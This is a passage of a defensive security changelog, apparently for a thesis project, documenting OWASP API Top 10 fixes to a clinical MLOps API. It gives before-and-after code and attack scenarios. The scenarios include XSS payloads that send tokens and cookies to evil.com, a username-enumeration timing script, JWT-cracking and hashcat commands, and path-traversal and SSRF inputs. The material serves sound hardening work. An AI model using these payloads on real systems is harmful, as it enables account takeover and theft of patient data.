# Code Changes — API Security Clinical Twin
**Project:** Tesi-FTD — MLOps Clinical Twin  
**Standard:** OWASP API Security Top 10 (2023)  
**Total changes:** 30 (Groups 1–6)

---

## Index

- [Group 1 — JWT Authentication (API2)](#group-1--jwt-authentication-api2) — Changes #1–8
- [Group 2 — Authorization (API1, API5)](#group-2--authorization-api1-api5) — Changes #9–12
- [Group 3 — Input Validation (API3, API7)](#group-3--input-validation-api3-api7) — Changes #13–16
- [Group 4 — Resource Protection (API4, API6)](#group-4--resource-protection-api4-api6) — Changes #17–20
- [Group 5 — Configuration (API8, API9, API10)](#group-5--configuration-api8-api9-api10) — Changes #21–25
- [Group 6 — Secure Features Added](#group-6--secure-features-added) — Changes #26–30

---

# Group 1 — JWT Authentication (API2)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #1
**Name:** Short access token expiry (15 minutes)  
**OWASP:** API2 — Broken Authentication  
**Modified file:** `api_gateway/core/config.py` (line 11)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
A JWT token is like an access badge: if you lose it, anyone who finds it can use it to enter. The longer it is valid, the more dangerous it becomes. With a 15-minute expiry, even a stolen token becomes useless almost immediately — like a cinema ticket that expires in a few minutes.

### Attack scenario before the fix
With a token valid for 24 hours (a common default setting):
```
1. Attacker intercepts the user's JWT token (XSS, log leak, sniffing)
2. All day long, even after the victim has closed their session:
   GET /analyze/ HTTP/1.1
   Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

3. Response: 200 OK — all the user's tasks visible
4. The token works for 24 hours with no way for the user to revoke it
```

### Code before
```python
# config.py — vulnerable setting
ACCESS_TOKEN_EXPIRE_MINUTES: int = Field(default=1440)  # 24 hours — too long
```

### Code after
```python
# api_gateway/core/config.py:11
ACCESS_TOKEN_EXPIRE_MINUTES: int = Field(default=15)  # 15 minutes
```

### Why it works
The JWT payload contains the `exp` (expiration) field. The `python-jose` library automatically verifies this field on every request: if `datetime.now(utc) > exp`, the token is rejected with 401. A 15-minute window reduces the window of abuse from 1440× to 1×.

### Impact
A stolen token can only be used for at most 15 minutes. The attacker must continuously obtain new tokens, which requires the original credentials — which they do not have.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #2
**Name:** Refresh token in httpOnly + SameSite=Strict cookie  
**OWASP:** API2 — Broken Authentication  
**Modified file:** `api_gateway/routers/auth.py` (lines 38–47)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
The refresh token is the key to obtaining new access tokens. If we put it in the JSON response body, any malicious JavaScript on the page can read and steal it. Using an httpOnly cookie means only the browser (not JavaScript) can see it — like putting the key in a safe invisible to code.

### Attack scenario before the fix
With the refresh token in the JSON body:
```
1. Site with XSS vulnerability (e.g. unsanitised comment):
   <script>
     fetch('/api/user-profile')
       .then(r => r.json())
       .then(data => {
         // localStorage.getItem('refresh_token') is readable!
         fetch('https://evil.com/steal?t=' + localStorage.getItem('refresh_token'))
       })
   </script>

2. Attacker uses the stolen token to obtain valid access tokens indefinitely:
   POST /refresh
   {"refresh_token": "eyJhbGci...STOLEN..."}

3. Response: 200 OK — new access token every 7 days forever
```

### Code before
```python
# Vulnerable: refresh token in JSON body
@router.post("/login")
def login(...):
    refresh_token = create_refresh_token(user)
    return {
        "access_token": access_token,
        "refresh_token": refresh_token,   # readable by JS!
        "token_type": "bearer",
    }
```

### Code after
```python
# api_gateway/routers/auth.py:38-47
def _set_refresh_cookie(response: Response, refresh_token: str) -> None:
    response.set_cookie(
        key=_REFRESH_COOKIE,
        value=refresh_token,
        httponly=True,        # JavaScript cannot read this cookie
        secure=False,         # True in production (HTTPS)
        samesite="strict",    # blocks cross-site sending (CSRF protection)
        max_age=_COOKIE_MAX_AGE,
        path="/",
    )
```

### Why it works
`httponly=True` instructs the browser NOT to expose the cookie to the `document.cookie` API or to any JavaScript code. The cookie is sent automatically by the browser on requests to `/refresh`, but no script can read or extract it. `samesite="strict"` prevents the cookie from being sent from requests originating from other domains (additional CSRF protection).

### Impact
An XSS attack can no longer steal the refresh token because it is not accessible from JavaScript. The attacker can at most steal the access token from memory (valid 15 min) but cannot renew it.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #3
**Name:** JWT token blacklist on logout via JTI  
**OWASP:** API2 — Broken Authentication  
**Modified file:** `api_gateway/core/security.py` (lines 87–93, 129–138), `api_gateway/models/domain.py` (lines 27–32)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
JWTs are "stateless": the server keeps no record of them, so it cannot invalidate them before expiry. It is like a paper plane ticket — you cannot "cancel" it once printed. The JTI blacklist solves this: every token has a unique ID (JTI), and at logout that ID is saved in a database as "cancelled". The next attempt with that token is blocked.

### Attack scenario before the fix
```
1. User logs out from the frontend
2. Frontend deletes the token from local memory — but the server doesn't know
3. Attacker had captured the token before logout:
   GET /analyze/ HTTP/1.1
   Authorization: Bearer eyJhbGci...POST_LOGOUT_TOKEN...

4. Response: 200 OK — the token is still valid until natural expiry
5. For 15 minutes after logout the attacker has full access to the account
```

### Code before
```python
# Logout did nothing server-side
@router.post("/logout")
def logout(response: Response):
    response.delete_cookie("refresh_token")
    # JWT token remains valid — no server-side revocation!
    return {"message": "Logged out"}
```

### Code after
```python
# api_gateway/core/security.py:87-93, 129-138
def _check_not_revoked(jti: str, db: Session) -> None:
    if db.query(RevokedToken).filter(RevokedToken.jti == jti).first():
        raise HTTPException(status_code=401, detail="Token revoked.")

def revoke_token(token: str, db: Session) -> None:
    payload = _decode_token(token)
    jti = payload.get("jti")
    exp = payload.get("exp")
    if jti and exp:
        expires_at = datetime.fromtimestamp(exp, tz=timezone.utc)
        if not db.query(RevokedToken).filter(RevokedToken.jti == jti).first():
            db.add(RevokedToken(jti=jti, expires_at=expires_at))
            db.commit()

# api_gateway/routers/auth.py:173-180
@router.post("/logout")
def logout(response, token, refresh_token, db, current_user):
    revoke_token(token, db)            # revoke access token
    if refresh_token:
        revoke_token(refresh_token, db) # revoke refresh token too
    response.delete_cookie(key=_REFRESH_COOKIE)
```

```python
# api_gateway/models/domain.py:27-32
class RevokedToken(Base):
    __tablename__ = "revoked_tokens"
    jti = Column(String, primary_key=True, index=True)
    revoked_at = Column(DateTime, default=datetime.utcnow)
    expires_at = Column(DateTime, nullable=False)
```

### Why it works
Every token generated by `_build_token()` receives a UUID as its `jti` field. At logout, this JTI is inserted into the `revoked_tokens` table. The `get_current_user()` function calls `_check_not_revoked()` on every request: if the JTI is in the blacklist, the request is rejected with 401 regardless of the expiry.

### Impact
Logout is now **effective**: a token captured before logout becomes useless the instant the user clicks "Logout". The attacker sees 401 on every subsequent request.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #4
**Name:** SECRET_KEY strength validation (minimum 64 characters)  
**OWASP:** API2 — Broken Authentication  
**Modified file:** `api_gateway/core/config.py` (lines 24–31)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
The SECRET_KEY is the digital signature of all JWTs: anyone who knows it can create valid tokens for any user. A short key (like "secret" or "mykey123") is like a 3-character password: an attacker can try all of them in seconds. A 64-character random key is mathematically impossible to guess.

### Attack scenario before the fix
```
1. App uses SECRET_KEY="secret" or "myapp-key-2024"
2. Attacker finds any JWT token (e.g. from the browser log)
3. Uses jwt-cracker or hashcat:
   $ jwt-cracker eyJhbGci... -a HS256 --wordlist rockyou.txt
   SECRET FOUND: "secret"

4. Generates a fake admin token:
   import jwt
   token = jwt.encode({"sub": "1", "role": "admin", "jti": "x"}, "secret", "HS256")

5. GET /admin/users HTTP/1.1
   Authorization: Bearer FAKE_ADMIN_TOKEN
   → 200 OK — full list of users
```

### Code before
```python
# config.py — no key validation
class Settings(BaseSettings):
    SECRET_KEY: str = Field(default="supersecretkey")  # short and weak!
    # anyone who guesses "supersecretkey" can sign tokens as admin
```

### Code after
```python
# api_gateway/core/config.py:24-31
@field_validator("SECRET_KEY")
@classmethod
def secret_key_strength(cls, v: str) -> str:
    if len(v) < 64:
        raise ValueError(
            f"SECRET_KEY must be >= 64 characters (current: {len(v)})"
        )
    return v
```

### Why it works
The Pydantic validator runs at service startup: if the key is too short, the application **does not start** with an explicit error. A 64-character random key (512 bits of entropy) makes brute-force computationally impossible: even with specialised hardware it would take billions of years.

### Impact
The service cannot start with a weak key. In production it is mandatory to use a cryptographically generated key (e.g. `openssl rand -hex 64`).

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #5
**Name:** JWT `sub` = numeric user_id (RFC 7519)  
**OWASP:** API2 — Broken Authentication  
**Modified file:** `api_gateway/core/security.py` (lines 62–66)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
The `sub` (subject) field in the JWT identifies the user. If we use the username as `sub`, a user with username "admin" collides with a user named "admin" created later. Using the numeric ID (immutable, unique in the DB) eliminates this ambiguity and aligns the code with RFC 7519 standard.

### Attack scenario before the fix
```
1. JWT token with sub="admin" (username)
2. Admin deletes their account and creates a new one with the same username
3. Old tokens with sub="admin" continue to work for the new account
4. Username change → old username token now points to the wrong user

POST /login {"username": "admin", "password": "Admin1234!"}
Token: {"sub": "admin", "role": "user"}  # if sub is username, it is mutable

OR — confusion in get_current_user:
user = db.query(User).filter(User.username == user_id).first()
# if user_id is "1 OR 1=1" in a misconfigured system → injection
```

### Code before
```python
# Vulnerable: sub is the username (mutable string)
def create_access_token(user: User) -> str:
    return _build_token(
        {"sub": user.username, "role": user.role},  # username as subject
        timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES),
    )

# get_current_user searched by username — mutable field
user = db.query(User).filter(User.username == payload["sub"]).first()
```

### Code after
```python
# api_gateway/core/security.py:62-66
def create_access_token(user: User) -> str:
    return _build_token(
        {"sub": str(user.id), "username": user.username, "role": user.role},
        timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES),
    )

# security.py:110
user = db.query(User).filter(User.id == int(user_id)).first()
```

### Why it works
The database ID is immutable, unique, and numeric. The lookup `User.id == int(user_id)` is type-safe: casting a malicious string to `int` raises `ValueError` before the SQL query. The username remains in the payload for frontend convenience but is not used for authentication.

### Impact
No ambiguity in user identification. Tokens are bound to a stable entity in the database. Injection attempts in the `sub` field fail with `ValueError` during the cast to integer.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #6
**Name:** bcrypt with 12 rounds (auditable configuration)  
**OWASP:** API2 — Broken Authentication  
**Modified file:** `api_gateway/core/security.py` (lines 17–21)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
Passwords are not stored in plaintext but as "fingerprints" (hashes). With bcrypt, `rounds` determine how long it takes to compute each hash: more rounds = slower for the attacker. With 10 rounds (default) about 100 hashes/second are computed; with 12 rounds it drops to about 25 hashes/second. This seems small, but on a stolen database of 1 million users, 12 rounds multiplies cracking time from months to years.

### Attack scenario before the fix
```
1. Attacker steals the SQLite database (e.g. via path traversal)
2. With bcrypt rounds=4 (too fast, used in tests):
   $ hashcat -m 3200 hashes.txt rockyou.txt
   → Cracking rate: ~50,000 hashes/second on GPU

3. With rounds=10 (undeclared default):
   → Cracking rate: ~1,000 hashes/second — better but not auditable

4. With rounds=12:
   → Cracking rate: ~250 hashes/second — much slower + configuration visible in code
```

### Code before
```python
# Vulnerable: implicit or too-low rounds
pwd_context = CryptContext(
    schemes=["bcrypt"],
    deprecated="auto",
    # rounds not specified → uses library default (often 10 or 12)
    # the problem is it is NOT AUDITABLE: which version uses which default?
)
```

### Code after
```python
# api_gateway/core/security.py:17-21
pwd_context = CryptContext(
    schemes=["bcrypt"],
    deprecated="auto",
    bcrypt__rounds=12,  # explicit 12 rounds — auditable configuration
)
```

### Why it works
Explicitly declaring `bcrypt__rounds=12` makes the value part of the source code and therefore subject to code review, security audits, and version control. Updating from 10 to 12 rounds (4× slower for the attacker) requires only changing one number. bcrypt automatically re-hashes old passwords on next login thanks to `deprecated="auto"`.

### Impact
A stolen database would take ~4× longer to crack compared to 10 rounds. The configuration is visible, auditable, and easily updatable for future standards.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #7
**Name:** Timing attack protection (constant-time authentication)  
**OWASP:** API2 — Broken Authentication  
**Modified file:** `api_gateway/core/security.py` (lines 28, 39–48)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
When a server responds faster to "user not found" than to "wrong password", an attacker can discover which usernames exist simply by measuring response times. It is like guessing whether a room is occupied by listening to how long it takes someone to answer the doorbell. The protection ensures the server always takes the same time, regardless of the user's existence.

### Attack scenario before the fix
```python
# Timing attack script
import requests, time

usernames = ["admin", "mario.rossi", "doctor1", "patient99"]
for username in usernames:
    start = time.time()
    requests.post("/login", data={"username": username, "password": "wrongpass"})
    elapsed = time.time() - start
    
    # Fast response (< 1ms) = user does NOT exist (no hash computed)
    # Slow response (> 50ms) = user EXISTS (bcrypt verified)
    if elapsed > 0.05:
        print(f"VALID USER: {username}")
```
Result: list of valid usernames without ever guessing a password.

### Code before
```python
# Vulnerable: immediate return if user not found
def authenticate_user(username, password, db):
    user = db.query(User).filter(User.username == username).first()
    if not user:
        return None  # immediate return — no bcrypt = fast response!
    if not verify_password(password, user.hashed_password):
        return None
    return user
```

### Code after
```python
# api_gateway/core/security.py:28, 39-48
_DUMMY_HASH: str = pwd_context.hash("__dummy_password_for_timing_protection__")

def authenticate_user(username: str, password: str, db: Session) -> Optional[User]:
    user = db.query(User).filter(User.username == username).first()
    hash_to_check = user.hashed_password if user else _DUMMY_HASH
    if not verify_password(password, hash_to_check):
        return None  # verify_password called ALWAYS, user or not
    return user
```

### Why it works
`_DUMMY_HASH` is pre-computed ONCE at startup (not on every request): zero overhead. When the user doesn't exist, the bcrypt verification is still executed against the dummy hash — an operation that takes the same time (~50ms) as verifying a real hash. The timing is now indistinguishable: "user not found" and "wrong password" have the same computational cost.

### Impact
The user enumeration attack via timing no longer works: all failed login requests take the same time, regardless of whether the username exists in the database.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #8
**Name:** Password strength validation (uppercase + digit + length)  
**OWASP:** API2 — Broken Authentication  
**Modified file:** `api_gateway/models/schemas.py` (lines 20–29, 65–74)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
A password like "pippo" or "123456" can be guessed in less than a second. Complexity rules (at least 8 characters, one uppercase letter, one digit) eliminate the weakest passwords that account for over 90% of successful cracks in real breaches. It is like requiring a lock to have at least 3 different types of mechanism.

### Attack scenario before the fix
```
1. System with no rules: user chooses password "hello123"
2. Attacker with rockyou.txt list:
   POST /login {"username": "mario", "password": "hello123"}
   → 401
   POST /login {"username": "mario", "password": "password"}
   → 200 OK! — found on the first common attempt
```

### Code before
```python
# No validation — any password accepted
class UserCreate(BaseModel):
    username: str
    password: str  # "a", "123", "password" — all valid
```

### Code after
```python
# api_gateway/models/schemas.py:20-29
@field_validator("password")
@classmethod
def password_strength(cls, v: str) -> str:
    if len(v) < 8:
        raise ValueError("Password must be at least 8 characters long")
    if not re.search(r'[A-Z]', v):
        raise ValueError("Password must contain at least one uppercase letter")
    if not re.search(r'[0-9]', v):
        raise ValueError("Password must contain at least one digit")
    return v
```

### Why it works
Validation happens in the Pydantic layer **before** the password reaches any business logic. An invalid password is rejected with HTTP 422 (Unprocessable Entity) with a clear message. The same validation is replicated in `ResetPasswordRequest` (lines 65–74) for consistency.

### Impact
The most common passwords (top 10,000 dictionary) are eliminated at registration. An attacker must use smaller, more specific dictionaries, significantly reducing the probability of a successful brute-force.

---

# Group 2 — Authorization (API1, API5)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #9
**Name:** BOLA — `owner_id` filter on every task query  
**OWASP:** API1 — Broken Object Level Authorization  
**Modified file:** `orchestrator/routers/analyze.py` (lines 114–122, 128–133, 168–178)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
BOLA (Broken Object Level Authorization) is the most widespread vulnerability in APIs: the server authenticates the user (who you are) but does not check whether that user can access THAT specific object (what you can see). It is like verifying you have a cinema ticket but not that the seat you want to occupy is yours.

### Attack scenario before the fix
```
User A creates task with ID 5 (their MRI)
User B is authenticated with a valid token and tries:

GET /analyze/status/5
Authorization: Bearer USER_B_TOKEN

# Without owner_id filter, the server responds:
200 OK {
  "status": "COMPLETED",
  "predicted_diagnosis": "bvFTD",
  "confidence": 0.92,
  "plot_data": {...}  # private clinical data of another patient!
}

# User B can enumerate all tasks:
for task_id in range(1, 1000):
    GET /analyze/status/{task_id}
    # Gets diagnoses of 1000 patients
```

### Code before
```python
# Vulnerable: no owner filter — everyone can see everyone's tasks
@router.get("/status/{task_id}")
async def get_task_status(task_id: int, db, current_user):
    task = db.query(Task).filter(Task.id == task_id).first()  # by ID only!
    if not task:
        raise HTTPException(status_code=404)
    return task  # data from any user!
```

### Code after
```python
# orchestrator/routers/analyze.py:128-133
@router.get("/status/{task_id}")
async def get_task_status(task_id, db, current_user):
    task = db.query(Task).filter(
        Task.id == task_id,
        Task.owner_id == current_user.id  # ← BOLA FILTER
    ).first()
    if not task:
        raise HTTPException(status_code=404, detail="Task not found or not authorized")
```

The same pattern is applied in:
- `GET /analyze/` (line 120–122): only the current user's tasks
- `GET /analyze/nifti/{task_id}` (lines 168–178): only owned NIfTI files

### Why it works
The SQL query becomes `WHERE id = ? AND owner_id = ?`: even if the attacker guesses the correct ID, the `owner_id` filter returns zero results if they are not the owner. The database never returns one user's data to another. The message "not found or not authorized" does not reveal whether the task exists (prevents enumeration).

### Impact
A user can only access their own tasks, even knowing other people's IDs. Enumerating IDs provides no clinical data of other patients — always receives 404.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #10
**Name:** BFLA — `user`/`admin` role system with enum  
**OWASP:** API5 — Broken Function Level Authorization  
**Modified file:** `api_gateway/models/domain.py` (lines 7–23)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
BFLA (Broken Function Level Authorization) means that "admin" endpoints are accessible to regular users. Without a role system, any authenticated user can call administrator-reserved functions. Having a `UserRole` enum with fixed values prevents a user from self-promoting via malicious input.

### Attack scenario before the fix
```
# Without enum, role was a free string field
# User registers with body:
POST /register
{"username": "hacker", "password": "Pass1234!", "role": "admin"}

# If the server doesn't filter the role field in input:
200 OK {"id": 5, "username": "hacker", "role": "admin"}

# Now hacker accesses admin endpoints:
GET /admin/users
Authorization: Bearer HACKER_TOKEN
200 OK [{"id": 1, "username": "admin"}, {"id": 2, ...}]
```

### Code before
```python
# Vulnerable: role as free string — mass assignment possible
class User(Base):
    role = Column(String, default="user")  # "admin", "superadmin", "ADMIN" — all accepted

class UserCreate(BaseModel):
    username: str
    password: str
    role: str = "user"  # user can specify it!
```

### Code after
```python
# api_gateway/models/domain.py:7-23
class UserRole(str, enum.Enum):
    USER = "user"
    ADMIN = "admin"

class User(Base):
    role = Column(
        Enum(UserRole, values_callable=lambda obj: [e.value for e in obj]),
        default=UserRole.USER,
        nullable=False,
        server_default="user",
    )
```

### Why it works
SQLAlchemy `Enum` with `values_callable` restricts accepted values at database level: any string other than `"user"` or `"admin"` causes an error. The `role` field is absent from `UserCreate` (input schema) and from `RegisterResponse` (registration output schema): no user can specify their own role at registration.

### Impact
A user cannot self-assign the admin role either through registration or profile update. The only way to become admin is for an existing admin to modify it directly in the database or via dedicated endpoints.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #11
**Name:** `require_admin` dependency — centralized protection  
**OWASP:** API5 — Broken Function Level Authorization  
**Modified file:** `api_gateway/core/security.py` (lines 120–126)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
Instead of copying the check `if user.role != "admin": raise 403` into every admin endpoint (risking forgetting one), there is a single `require_admin` function injected as a dependency. Centralizing verification in one place means changing authorization logic automatically reflects on all endpoints.

### Attack scenario before the fix
```
# With checks copied into every endpoint, one might be forgotten:
@router.get("/admin/users")
def list_users(current_user = Depends(get_current_user)):
    if current_user.role != "admin":
        raise HTTPException(403)
    return db.query(User).all()

@router.delete("/admin/users/{id}")
def delete_user(user_id, current_user = Depends(get_current_user)):
    # FORGOT the admin check! → any authenticated user can delete
    user = db.query(User).filter(User.id == user_id).first()
    db.delete(user)
    db.commit()
```

### Code before
```python
# Duplicated check subject to omissions
@router.delete("/admin/users/{id}")
def delete_user(current_user = Depends(get_current_user)):
    # developer forgets admin check → endpoint open!
    ...
```

### Code after
```python
# api_gateway/core/security.py:120-126
def require_admin(current_user: User = Depends(get_current_user)) -> User:
    if current_user.role != "admin":
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Access denied: insufficient privileges",
        )
    return current_user

# Used on ALL admin endpoints:
# api_gateway/routers/auth.py:246-258
@router.get("/admin/users")
def list_users(admin: User = Depends(require_admin), ...):
    ...

@router.delete("/admin/users/{user_id}")
def delete_user(admin: User = Depends(require_admin), ...):
    ...

# orchestrator/routers/analyze.py:192-203
@router.delete("/admin/{task_id}")
async def admin_delete_task(admin: User = Depends(require_admin), ...):
    ...
```

### Why it works
FastAPI `Depends()` executes the dependency before the function body: if `require_admin` raises an exception, the function is never invoked. It is impossible to "forget" the check because it is part of the function signature, visible directly in the endpoint declaration.

### Impact
All `admin/` endpoints are uniformly protected. Adding a new admin endpoint requires only `Depends(require_admin)` — the check cannot be accidentally omitted.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #12
**Name:** `/admin/*` endpoints — complete segregation  
**OWASP:** API5 — Broken Function Level Authorization  
**Modified file:** `api_gateway/routers/auth.py` (lines 238–258), `orchestrator/routers/analyze.py` (lines 192–203)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
Having the `/admin/` prefix on all privileged endpoints serves two purposes: it makes it clear during code review which endpoints are critical, and allows middleware or WAF rules to be applied to that prefix. The admin task delete in the orchestrator allows admins to manage any user's tasks, explicitly bypassing the `owner_id` filter.

### Attack scenario before the fix
```
# Without segregation, an admin could use the same user endpoint
# to see other people's data — no separation of responsibility.
# Or worse, un-prefixed admin endpoints were not recognised as such:

DELETE /tasks/42   # looked like a normal endpoint, but deleted any user's task
Authorization: Bearer NORMAL_USER_TOKEN
200 OK  # because the admin check was missing
```

### Code before
```python
# Lack of segregation: same endpoint for admin and user
@router.delete("/tasks/{task_id}")
async def delete_task(task_id, current_user = Depends(get_current_user)):
    task = db.query(Task).filter(Task.id == task_id).first()
    db.delete(task)  # any task, any user
```

### Code after
```python
# orchestrator/routers/analyze.py:192-203
@router.delete("/admin/{task_id}", status_code=status.HTTP_204_NO_CONTENT)
async def admin_delete_task(
    task_id: int,
    admin: User = Depends(require_admin),   # admins only
    db: Session = Depends(get_db),
):
    """Delete any task. Admins only."""
    task = db.query(Task).filter(Task.id == task_id).first()
    if not task:
        raise HTTPException(status_code=404)
    db.delete(task)
    db.commit()
```

### Why it works
The `/admin/` prefix combined with `Depends(require_admin)` creates a double barrier: naming convention + runtime enforcement. A regular user attempting `/admin/42` receives 403 before the database query is even executed.

### Impact
Regular users cannot delete, list, or modify other people's resources. Admins have separate, tracked functionality for global management. Every admin access is logged with the admin's identity.

---

# Group 3 — Input Validation (API3, API7)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #13
**Name:** Mass assignment prevention — separate input/output schemas  
**OWASP:** API3 — Broken Object Property Level Authorization  
**Modified file:** `api_gateway/models/schemas.py` (lines 6–36, 51–54)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
Mass assignment means the user sends "extra" fields in JSON (like `role: "admin"`) and the server accepts and saves them. It is like filling in a form where there are hidden fields you should not modify, but the system accepts them anyway. Separating the input schema (what the user can send) from the output schema (what the server returns) blocks this attack.

### Attack scenario before the fix
```json
// User sends to POST /register:
{
  "username": "hacker",
  "password": "Pass1234!",
  "role": "admin",
  "id": 1,
  "hashed_password": "$2b$12$fakeHash..."
}
// If the server uses the same schema for input and output,
// it also accepts "role" and "hashed_password", overwriting DB values
```

### Code before
```python
# Vulnerable: same schema used for input and output
class User(BaseModel):
    id: int
    username: str
    hashed_password: str  # exposed in output!
    role: str             # accepted in input! → mass assignment
```

### Code after
```python
# api_gateway/models/schemas.py — separate schemas
class UserCreate(BaseModel):          # INPUT: only what the user can send
    username: str
    password: str
    email: Optional[str] = None
    # NO: id, role, hashed_password

class UserResponse(BaseModel):        # OUTPUT: only what the server returns
    id: int
    username: str
    role: str
    model_config = ConfigDict(from_attributes=True)
    # NO: hashed_password, email (private)

class RegisterResponse(BaseModel):    # OUTPUT registration: even more limited
    id: int
    username: str
    # NO: role (not needed for the registration flow)
```

### Why it works
Pydantic ignores any field not declared in the schema. If `UserCreate` does not have the `role` field, the value sent by the user in JSON is silently discarded before reaching business logic. The registration code explicitly assigns `role="user"` regardless of input.

### Impact
No unauthorized field can be set via API. The hashed password never appears in a response. The admin role cannot be self-assigned via registration.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #14
**Name:** `model_name` whitelist — SSRF and path traversal prevention  
**OWASP:** API7 — Server Side Request Forgery  
**Modified file:** `orchestrator/routers/analyze.py` (lines 20–29), `model_service/main.py` (lines 17–28)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
The ML model name is used to build file paths and requests to MLflow. If not validated, an attacker could insert `"../../etc/passwd"` as the model name and read arbitrary files from the server. The whitelist accepts ONLY the three valid models and rejects everything else.

### Attack scenario before the fix
```
# Without whitelist, attacker sends:
POST /analyze/
Content-Type: multipart/form-data
model_name=../../../etc/passwd&file=...

# Server builds the path:
model_path = f"/models/{model_name}/model.rds"
# Becomes: /models/../../../etc/passwd/model.rds
# → path traversal to system files

# Or SSRF towards internal MLflow:
model_name=http://mlflow:5000/api/2.0/mlflow/runs/search
# The model_service makes a request to this URL
# → unauthorized access to internal infrastructure
```

### Code before
```python
# Vulnerable: model_name not validated — used directly in path
@router.post("/")
async def upload_nifti_file(model_name: str = Form(...), ...):
    model_path = f"/models/{model_name}/model.rds"  # path traversal!
    # or used to build URLs toward MLflow without sanitization
```

### Code after
```python
# orchestrator/routers/analyze.py:20-29
ALLOWED_MODELS = {"HC_vs_bvFTD", "HC_vs_svPPA", "HC_vs_nfvPPA"}

def _validate_model_name(model_name: str) -> str:
    if model_name not in ALLOWED_MODELS:
        raise HTTPException(
            status_code=422,
            detail=f"Invalid model. Accepted values: {sorted(ALLOWED_MODELS)}"
        )
    return model_name

# Identical validation in model_service/main.py:17-28
ALLOWED_MODELS = {"HC_vs_bvFTD", "HC_vs_svPPA", "HC_vs_nfvPPA"}
```

### Why it works
The whitelist (set of exactly allowed values) is the safest method for validating identifiers used in I/O operations. Any string not present in `ALLOWED_MODELS` is rejected with 422 before reaching any filesystem or network call. Validation is applied on BOTH services (orchestrator and model_service) for defense-in-depth.

### Impact
Path traversal and SSRF via `model_name` are impossible: only the three exact strings are accepted. The attack surface toward MLflow and the filesystem is reduced to zero for this vector.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #15
**Name:** Username regex whitelist — XSS and special character blocking  
**OWASP:** API3 — Broken Object Property Level Authorization  
**Modified file:** `api_gateway/models/schemas.py` (lines 11–18)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
A username like `<script>alert('xss')</script>` or `'; DROP TABLE users;--` could cause damage if saved in the database and later displayed in the dashboard. The regex limits usernames to safe characters (letters, digits and `._-`), eliminating at the root any injection or XSS attempt via the username field.

### Attack scenario before the fix
```
# Stored XSS via username:
POST /register
{"username": "<img src=x onerror=fetch('https://evil.com/'+document.cookie)>",
 "password": "Pass1234!"}
→ 201 Created

# When the admin views the user list:
GET /admin/users → returns the username with HTML tags
# If the frontend renders without escaping: XSS executed in the admin's browser!

# SQL injection via username (if used in non-parametrised queries):
{"username": "admin'--"}
```

### Code before
```python
# No username format validation
class UserCreate(BaseModel):
    username: str  # "admin'--", "<script>", "../../" — all accepted
    password: str
```

### Code after
```python
# api_gateway/models/schemas.py:11-18
@field_validator("username")
@classmethod
def username_safe(cls, v: str) -> str:
    if not re.match(r'^[a-zA-Z0-9_.\-]{3,50}$', v):
        raise ValueError(
            "Invalid username. Use only letters, digits, . _ - (3-50 characters)"
        )
    return v
```

### Why it works
The regex `^[a-zA-Z0-9_.\-]{3,50}$` uses a character whitelist (safer approach than a blacklist): any character not in `[a-zA-Z0-9_.-]` is rejected, including `<>'";&/\` needed for XSS and injection. The 3–50 character limit prevents empty usernames and overflow. Validation happens in Pydantic before persistence.

### Impact
XSS via username is impossible: the necessary HTML characters (`<`, `>`, `"`, `'`) are not in the whitelist. No dangerous username can be saved in the database.

---

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
## Change #16
**Name:** MRI file validation with NIfTI magic bytes  
**OWASP:** API3 — Broken Object Property Level Authorization  
**Modified file:** `orchestrator/routers/analyze.py` (lines 32–66)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Simple explanation
